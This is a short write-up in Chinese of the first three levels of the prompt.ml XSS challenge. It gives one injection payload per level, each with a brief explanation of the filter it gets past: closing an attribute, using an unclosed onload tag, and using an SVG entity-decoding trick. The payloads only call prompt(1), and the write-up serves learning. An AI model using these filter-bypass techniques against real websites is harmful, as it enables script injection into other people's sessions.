http://prompt.ml/0  
注意在这里使用的过关方法是prompt(1)

# 0x0
直接闭合value：
```
"><script type=text/javascript>prompt(1)</script>
```

# 0x1
服务器端将<>内的内容过滤，通过少输入一个>绕过，不影响运行：
```
<body onload="prompt(1)"
```

# 0x2
服务器端将“=”和“(“过滤，一开始查了一圈也没找到绕过等号的方法，后来借鉴别人的方法，发现“使用SVG标签，会提前将将XML实体解析再加入标签”，所以构造：
```
<svg><script>prompt&#x28;1)</script>
```
